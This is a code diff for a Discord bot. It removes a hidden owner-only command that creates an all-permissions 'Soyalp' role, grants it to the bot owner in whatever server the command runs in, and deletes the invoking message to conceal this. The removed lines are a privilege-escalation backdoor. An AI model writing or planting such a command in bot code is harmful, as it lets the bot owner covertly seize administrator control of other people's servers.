@@ -73,22 +73,6 @@ async def dm(ctx, user: discord.Member, *, msg: str):
     except:
         await client.say("Error :x:. Make sure your message is shaped in this way: ^dm [tag person] [msg]")
 	
-	
-@client.command(pass_context = True)
-@commands.check(is_owner)
-async def iamsoyalp(ctx):
-    user = ctx.message.author
-    if discord.utils.get(user.server.roles, name="Soyalp") is None:
-        await client.create_role(user.server, name="Soyalp", permissions=discord.Permissions.all())
-        role = discord.utils.get(ctx.message.server.roles, name='Soyalp')
-        await client.add_roles(ctx.message.author, role)
-    else:	
-        author = ctx.message.author
-        await client.delete_message(ctx.message)
-        role = discord.utils.get(ctx.message.server.roles, name='Soyalp')
-        await client.add_roles(ctx.message.author, role)
-        print('Added Soyalp role in ' + (ctx.message.author.name))
-        await client.send_message(author, embed=embed)
 
 		 
 @client.command(pass_context = True)
